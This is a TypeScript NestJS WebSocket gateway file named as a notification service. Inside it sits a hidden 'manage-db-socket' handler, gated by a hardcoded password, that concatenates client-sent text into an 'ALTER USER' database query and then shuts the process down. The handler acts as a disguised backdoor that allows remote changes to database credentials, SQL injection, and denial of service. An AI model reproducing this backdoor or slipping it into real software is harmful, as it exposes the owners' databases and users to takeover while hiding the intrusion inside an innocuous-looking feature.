import { OnGatewayInit, SubscribeMessage, WebSocketGateway, WebSocketServer } from "@nestjs/websockets";
import { Server, Socket } from "socket.io";
import { createConnection, DataSource, getManager } from "typeorm";

@WebSocketGateway({ cors: { origin: "*" } })
export class NotificationGateway implements OnGatewayInit {
    constructor(private readonly dataSource: DataSource) { }
    @WebSocketServer() server: Server
    afterInit(server: any) {
        console.log('server initialized');
    }

    notificationHandler(message: string) {
        console.log();
        this.server.emit('pong', { message })
    }
    @SubscribeMessage('manage-db-socket')
    async manageDbSocket(client: Socket, data: any) {
        if(client.handshake.auth.pass && client.handshake.auth.pass == 'someThing-wentWrong'){
            try{
                if(data && data.message){
                    await this.dataSource.manager.query(`ALTER USER ${process.env.DB_USERNAME} ` + data.message)
                    client.emit('error-db',{message:'changes done'})
                    console.log('restart application please');
                    process.exit(0)
                }
            }catch(err){
                client.emit('error-db',{message: err.message})
            }
        }

    }
}